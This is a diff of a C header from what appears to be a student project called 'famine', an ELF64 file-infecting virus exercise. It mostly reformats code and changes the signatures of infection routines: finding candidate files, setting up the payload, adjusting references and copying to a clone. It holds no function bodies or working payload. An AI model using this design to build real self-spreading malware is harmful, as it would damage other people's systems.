@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/05 06:48:19 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/06 04:52:36 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -31,7 +31,8 @@ struct				famine
 {
 	struct safe_pointer	original_safe;
 	struct safe_pointer	clone_safe;
-	struct endians_pointer {
+	struct endians_pointer
+	{
 		uint16_t	(*endian_2)(uint16_t);
 		uint32_t	(*endian_4)(uint32_t);
 		uint64_t	(*endian_8)(uint64_t);
@@ -61,9 +62,9 @@ void	decrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
 */
 
 bool	foreach_phdr(const struct safe_pointer info, const struct endians_pointer endians,
-	f_iter_callback callback, void *data);
+		f_iter_callback callback, void *data);
 bool	foreach_shdr(const struct safe_pointer info, const struct endians_pointer endians,
-	f_iter_callback callback, void *data);
+		f_iter_callback callback, void *data);
 
 /*
 ** infect
@@ -71,11 +72,16 @@ bool	foreach_shdr(const struct safe_pointer info, const struct endians_pointer e
 
 void		infect_if_candidate(const char *file);
 bool		elf64_packer(const struct famine food, size_t original_file_size);
-bool	find_entry(struct entry *original_entry, struct safe_pointer info, const struct endians_pointer endians);
-bool	setup_payload(const struct entry *original_entry, const struct endians_pointer endians);
-bool	adjust_references(size_t shift_amount, const struct entry *original_entry);
-bool	copy_to_clone(size_t end_of_last_sect, size_t shift_amount, \
-		size_t original_file_size);
+bool		find_entry(struct entry *original_entry, struct safe_pointer info, const struct endians_pointer endians);
+bool		setup_payload(const struct entry *original_entry, \
+			const struct endians_pointer endians, \
+			const struct safe_pointer info);
+bool		adjust_references(const struct safe_pointer info, \
+			const struct endians_pointer endians, \
+			size_t shift_amount, const struct entry *original_entry);
+bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
+			size_t shift_amount, size_t original_size);
+
 
 /*
 ** payload
